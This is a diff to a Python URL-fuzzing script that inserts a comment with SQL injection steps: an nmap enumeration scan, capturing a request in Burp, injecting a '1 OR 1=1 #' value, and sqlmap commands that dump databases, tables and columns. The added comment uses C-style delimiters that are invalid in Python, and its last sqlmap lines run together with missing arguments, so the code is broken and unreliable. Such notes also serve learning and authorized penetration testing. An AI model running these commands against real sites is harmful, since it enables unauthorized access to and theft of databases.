@@ -36,7 +36,14 @@ def fuzz(url, payloads):
             print(Style.BRIGHT + Fore.RED + "Timeout Detected with", new_url)
         else:
             print(Style.BRIGHT + Fore.CYAN + "Not working with this following payload:", payload)
-
+/***nmap -sV --script=http-enum [target domain or IP address]
+Find any input parameter on website and capture the request in burp and then use it to perform sql injection using sqlmap.
+Now open the burp and check the input parameters and intercept on then type some as '1 OR ANY TEXT'
+You get some value on burp copy that and create the txt file. (1 OR 1=1 #)
+sqlmap -r <txt file from burpsuite> --dbs
+sqlmap -r <txt file from burpsuite> -D <database name> --tables
+sqlmap -r <txt file from burpsuite> -D <database name> -T  --columnssqlmap -r <txt file from burpsuite> -D <database name> -T
+*///
 def verify(url):
     url_test = url.replace("{fuzz}", "")
     req = requests.get(url_test)
